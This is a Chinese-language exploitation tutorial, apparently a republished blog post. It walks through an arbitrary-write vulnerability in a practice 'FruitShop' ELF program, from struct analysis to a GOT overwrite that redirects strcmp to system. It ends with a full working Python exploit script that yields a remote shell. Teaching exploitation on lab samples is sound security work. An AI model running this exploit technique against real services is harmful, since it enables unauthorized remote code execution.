> 原文链接: https://www.anquanke.com//post/id/170663 


# Pwn FruitShop的故事（下）


                                阅读量   
                                **157507**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t01d1aeef77c6b4014d.jpg)](https://p2.ssl.qhimg.com/t01d1aeef77c6b4014d.jpg)



## Pwn FruitShop的故事（下）

在上一篇`Pwn FruitShop的故事（上）`中我们介绍了目标样本产生的背景并分享了一个64位栈溢出漏洞的利用方式。本次我们将继续分享一个64位内存任意写的漏洞，并在系统开启ASLR的环境下完成漏洞的利用。

为便于大家复现，提供样本ELF程序和样本源码，可以在x64的linux虚拟机上运行。<br>
环境：Ubuntu 16.04 x64

分析的样本程序：f2_x64_point<br>
链接：[https://pan.baidu.com/s/1Ju18mj3i0-WVHFim-7A6ng](https://pan.baidu.com/s/1Ju18mj3i0-WVHFim-7A6ng)<br>
提取码：ofmn

对应样本的源代码：f2_x64_point.cpp<br>
链接：[https://pan.baidu.com/s/14ItVEwVQ5jWJTPpM6syYWg](https://pan.baidu.com/s/14ItVEwVQ5jWJTPpM6syYWg)<br>
提取码：zwlm



## 0x00 样本分析

在第一轮的筛选中，我们通过`checksec`对目标程序采用的安全机制进行检测，筛出了一个没有在栈中开启`Canary`保护的样本。在第二轮的筛选中，我们通过IDA对剩余样本进行静态分析，筛选出一个结构体中变量溢出导致的内存任意写漏洞的样本程序。

该程序的checksec结果如下：<br>[![](https://p2.ssl.qhimg.com/t016a39ec2a37a4a4d8.png)](https://p2.ssl.qhimg.com/t016a39ec2a37a4a4d8.png)<br>
通过IDA分析，该程序虽然在很多地方对输入字符串的长度没有做合法性检查，但由于有`Canary`保护机制的存在，我们无法使用覆盖返回地址的方法对栈溢出漏洞进行利用。但是，可以注意到我们是可以修改`.got.plt`表。

首先我们针对其水果的结构体和链表结构进行分析：<br>[![](https://p4.ssl.qhimg.com/t013a15c427d4eeb66e.png)](https://p4.ssl.qhimg.com/t013a15c427d4eeb66e.png)<br>
通过IDA静态分析其水果链表的创建过程，可见一个水果节点结构体的大小为0x90=144B大小。<br>[![](https://p0.ssl.qhimg.com/t01076b90ddce2e7535.png)](https://p0.ssl.qhimg.com/t01076b90ddce2e7535.png)<br>
该函数为初始化水果链表的过程，结合F5将汇编代码转换为伪C代码，可以分析出一个水果节点的结构体为：

```
# Struct Comm 144B
# 0x00  int No;                     //4B
# 0x04  char name[20];              //20B
# 0x18  double price;               //8B
# 0x20  int count;                  //4B
# 0x24  char Description[100];      //100B
# 0x88  struct commdity *next;      //8B
```



## 0x01 漏洞成因

[![](https://p4.ssl.qhimg.com/t01b7c06c1f7212b9fc.png)](https://p4.ssl.qhimg.com/t01b7c06c1f7212b9fc.png)<br>
通过对ChangeFruit函数的分析和已分析出的水果节点结构体，我们发现由于没有对结构体中的Description的输入做长度的检测，而Description后面紧跟的是`*next`指针。我们可以通过溢出Description来覆盖`*next`的值，使我们控制`*next`指针。<br>
控制了`*next`指针后，就可以通过改写链表头结点的`*next`，再调用`ChangeFruit()`函数对链表结点中`*next`指向的内存空间进行赋值，从而造成了内存任意写的漏洞。<br>[![](https://p1.ssl.qhimg.com/t01aabb817c18989703.png)](https://p1.ssl.qhimg.com/t01aabb817c18989703.png)



## 0x02 漏洞利用

进行动态调试和分析，使用GDB工具。先在Ubuntu虚拟机终端上运行：<br>`socat tcp-l:8888,reuseaddr,fork exec:"stdbuf -i0 -o0 -e0 ./f2_x64_point"`<br>
在利用nc连接虚拟机端口，用ps -e查看f2_x64_point进程的pid，再用`gdb attach [pid]`上对应pid的进程结合断点进行调试。

已分析出目标程序有任意内存写的漏洞后，再配合`.got.plt`表可写和No PIE，就可以利用改写`.got.plt`表中某函数对应的地址完成漏洞的利用。

#### <a class="reference-link" name="&lt;1&gt;.got.plt%E8%A1%A8%E4%B8%AD%E8%A6%86%E7%9B%96%E5%87%BD%E6%95%B0%E7%9A%84%E9%80%89%E6%8B%A9"></a>&lt;1&gt;.got.plt表中覆盖函数的选择

[![](https://p4.ssl.qhimg.com/t0173c9f727d0972eb2.png)](https://p4.ssl.qhimg.com/t0173c9f727d0972eb2.png)<br>
通过分析程序的流程，在管理员登录的login函数中，我们发现strcmp系统调用符合漏洞利用的要求，如果我们能将`.got.plt`表中的对应`strcmp@.got.plt`函数的地址改为`system@.plt`的地址(0x4007C0)，就可以通过输入name来给strcmp函数传入参数，继而等价于给system函数传入参数并执行，从而利用漏洞执行了恶意代码。

[![](https://p4.ssl.qhimg.com/t01e0d0e35bb334d256.png)](https://p4.ssl.qhimg.com/t01e0d0e35bb334d256.png)<br>[![](https://p3.ssl.qhimg.com/t01605665fb3e3568f8.png)](https://p3.ssl.qhimg.com/t01605665fb3e3568f8.png)

#### <a class="reference-link" name="&lt;2&gt;.got.plt%E8%A1%A8%E8%A6%86%E7%9B%96%E8%BF%87%E7%A8%8B"></a>&lt;2&gt;.got.plt表覆盖过程

通过逆向得到管理员的账户和密码，admin/123，利用Python编写socket通信程序实现与fshop_b7的交互。<br>
利用下图来说明strcmp@.got.plt改写的过程。<br>[![](https://p5.ssl.qhimg.com/t01d4d87d9ebd3ada00.png)](https://p5.ssl.qhimg.com/t01d4d87d9ebd3ada00.png)

```
login('admin','123')

def changeFruit(id,price,amount,des):
    client.sendall(bytes('2n', encoding='ascii'))
    sendData(id + 'n')
    sendData(price + 'n')
    sendData(amount + 'n')
    sendBin(des)
```

①首先调用ChangeFruit函数修改第一个水果节点，通过控制Description来覆盖`*next`指针的值，使其指向一片暂时无用的内存区域，即地址b(0x602270)

```
bHex1 = b'x41'*100 + 
        b'x70x22x60x00' 
        b'x0Dx0A'
changeFruit('1','0','0',bHex1)
```

调用ChangeFruit函数修改第一个水果节点后的第一个结点内存数据，红框内是我们控制的指想第二个节点的`*next`的数值。<br>[![](https://p0.ssl.qhimg.com/t011b9f227bec192f44.png)](https://p0.ssl.qhimg.com/t011b9f227bec192f44.png)

②调用ChangeFruit函数修改第二个水果节点，由于第一个水果节点的`*next`已被我们控制，即可以在指定的第二个水果节点写入我们期望的值。<br>
由于`strcmp@.got.plt`地址为0x602058，则第三个水果节点的起始地址为0x602058-0x24=0x602034，我们要通过漏洞修改这个地址对应的值，但由于该地址中含有0x20，0x20会使`scanf("%s",comm-&gt;Description)`的输入会发生截断，因而无法通过`scanf("%s",comm-&gt;Description)`传入0x20，但可以通过`scanf("%d",&amp;comm-&gt;count)`利用count数量来传入带0x20的地址。`Int(0x602034)=6299700`

```
changeFruit('2','0','6299700',b'x00x0Dx0A')
```

调用ChangeFruit函数修改第二个水果节点后的第二个结点内存数据，利用count(水果数量)传入0x602034<br>[![](https://p0.ssl.qhimg.com/t014f033a81403c38e6.png)](https://p0.ssl.qhimg.com/t014f033a81403c38e6.png)

> <p>PS：如果使用Struct Commdity中的int count对strcmp@.got.plt进行覆盖，<br>
会导致system@.got.plt也会被覆盖，导致程序流程中调用system函数时出现错误！利用失败。<br>
0x602058-0x20=0x602038 =&gt; int:6299704 fail!</p>

③再调用ChangeFruit函数修改第一个水果节点,重新修改`*next`指针，指向0x602270+0x20-0x88=0x602208的地址。新的第二个水果节点的`*next`指针的对应的值就为0x602034。见上图蓝色箭头和虚线框，指的是第②步中第二节点的数据结构。

```
bHex2 = b'x41'*100 + 
        b'x08x22x60x00' 
        b'x0Dx0A'
# 0x602270+0x20-0x88=0x602208
changeFruit('1','0','0',bHex2)
```

再调用ChangeFruit函数修改第一个水果节点,重新修改*next指针，完成后的3个结点内存数据<br>[![](https://p2.ssl.qhimg.com/t0118fe6dc0288cb195.png)](https://p2.ssl.qhimg.com/t0118fe6dc0288cb195.png)

④通过上面3步，此时第三个节点的起始地址为0x602034，调用ChangeFruit函数修改第三个水果节点，通过控制Description，改写0x602058地址对应的值，改为0x4007C0，完成`strcmp@.got.plt`的改写，之后在程序中调用strcmp函数就等同于调用system函数。

```
changeFruit('3','0','0',b'xC0x07x40x00x00x00x00x0Dx0A')
```

调用ChangeFruit函数修改第三个水果节点后，第三个结点内存数据（已完成对strcmp@.got.plt的修改）<br>[![](https://p4.ssl.qhimg.com/t01bc55bac6c1f0040e.png)](https://p4.ssl.qhimg.com/t01bc55bac6c1f0040e.png)

⑤利用脚本交互，输入3，退出login函数，再输入0，重新进入login函数。<br>
此时调用strcmp就是调用system函数，利用name传入想要执行的命令，即可被传入system函数实现执行，完成漏洞的利用，得到了shell。

```
sendData('3n')
sendData('0n')

while(1):
    command = input('[+] Shell&gt;')
    sendData(command + 'n')
    sendData('27n')
```

[![](https://p0.ssl.qhimg.com/t016277a639b49ccaca.png)](https://p0.ssl.qhimg.com/t016277a639b49ccaca.png)

完整利用过程：<br>[![](https://p0.ssl.qhimg.com/t01281cae396fd2dd71.gif)](https://p0.ssl.qhimg.com/t01281cae396fd2dd71.gif)

完整利用代码：

```
import socket
import time

targetIp = '192.168.150.137'
targetPort = 8888

client = socket.socket()
client.connect((targetIp,targetPort))

def sendData(strData):
    bHex = bytes(strData, encoding='ascii')
    client.sendall(bHex)
    time.sleep(0.2)
    data = client.recv(1024)
    try:
        print(str(data, "ascii"))
    except:
        print(data)

def sendBin(bHex):
    client.sendall(bHex)
    time.sleep(0.2)
    data = client.recv(1024)
    try:
        print(str(data, "ascii"))
    except:
        print(data)

def login(user,password):
    sendData('0n')
    sendData(user + 'n')
    sendData(password + 'n')

def changeFruit(id,price,amount,des):
    client.sendall(bytes('2n', encoding='ascii'))
    sendData(id + 'n')
    sendData(price + 'n')
    sendData(amount + 'n')
    sendBin(des)

login('admin','123')

bHex1 = b'x41'*100 + 
        b'x70x22x60x00' 
        b'x0Dx0A'

changeFruit('1','0','0',bHex1)
changeFruit('2','0','6299700',b'x00x0Dx0A')

bHex2 = b'x41'*100 + 
        b'x08x22x60x00' 
        b'x0Dx0A'

changeFruit('1','0','0',bHex2)
changeFruit('3','0','0',b'xC0x07x40x00x00x00x00x0Dx0A')

sendData('3n')
sendData('0n')

print('**E*************l***********t*********D*********e*******************')
print('*****x*************o***********!*********o*********!*****************')
print('********p************i**********************n************************')

while(1):
    command = input('[+] Shell&gt;')
    sendData(command + 'n')
    sendData('27n')
```



## 0x03 结语

通过分享对2个样本的漏洞定位和利用过程，加深了对Linux漏洞利用技术的了解，同时希望能与各位大佬们相互交流，共同进步。作为刚刚跨入安全行业的小白，还有很多东西需要向大家学习，请大家多多指教~
